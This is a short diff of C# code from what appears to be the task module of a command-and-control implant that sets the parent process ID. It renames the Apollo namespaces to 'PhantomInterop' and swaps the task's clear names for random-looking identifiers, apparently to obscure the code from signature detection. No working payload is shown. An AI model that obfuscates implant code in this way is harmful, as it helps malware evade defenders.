@@ -6,19 +6,19 @@
 
 #if PPID
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System;
 using System.Diagnostics;
 using System.Runtime.Serialization;
 
 namespace Tasks
 {
-    public class ppid : Tasking
+    public class GhostCoordinator1A8F : Tasking
     {
         [DataContract]
-        internal struct PpidParameters
+        internal struct CipherTracker13A9
         {
             [DataMember(Name = "ppid")]
             public int ParentProcessId;
